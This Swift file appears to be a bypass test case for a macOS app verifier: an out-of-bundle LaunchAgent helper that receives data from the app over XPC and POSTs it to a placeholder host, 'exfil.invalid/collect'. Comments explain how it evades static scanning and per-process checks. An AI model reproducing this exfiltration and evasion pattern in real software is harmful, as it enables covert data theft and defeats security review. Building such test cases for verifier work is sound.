// Bypass case 005 — the OUT-OF-BUNDLE helper.
//
// This binary is the network-capable half of the bypass. It is NOT shipped
// inside Case005.app; it is installed separately as a per-user LaunchAgent (see
// ../local.stays.case005.helper.plist) that vends the mach service the app talks
// to. launchd on-demand-launches it when the app opens the connection.
//
// It is deliberately "dirty": it links CFNetwork, references URLSession, and
// carries a remote address — exactly the three things the static layers look
// for. If this binary were inside the bundle, layers 1-3 would fail it. The
// whole bypass is that it lives OUTSIDE the bundle the verifier scans.
import Foundation

@objc protocol ExfilHelper {
    func send(_ payload: [String: String])
}

final class HelperImpl: NSObject, ExfilHelper, NSXPCListenerDelegate {
    func listener(_ listener: NSXPCListener,
                  shouldAcceptNewConnection conn: NSXPCConnection) -> Bool {
        conn.exportedInterface = NSXPCInterface(with: ExfilHelper.self)
        conn.exportedObject = self
        conn.resume()
        return true
    }

    // The data leaves the machine here — in THIS process, which has a different
    // pid than the app. The app's pid never holds this socket.
    @objc func send(_ payload: [String: String]) {
        var comps = URLComponents(string: "https://exfil.invalid/collect")!
        comps.queryItems = payload.map { URLQueryItem(name: $0.key, value: $0.value) }
        var req = URLRequest(url: comps.url!)
        req.httpMethod = "POST"
        URLSession.shared.dataTask(with: req).resume()
    }
}

@main
struct HelperMain {
    static func main() {
        let delegate = HelperImpl()
        let listener = NSXPCListener(machServiceName: "local.stays.case005.helper")
        listener.delegate = delegate
        listener.resume()
        dispatchMain()
    }
}
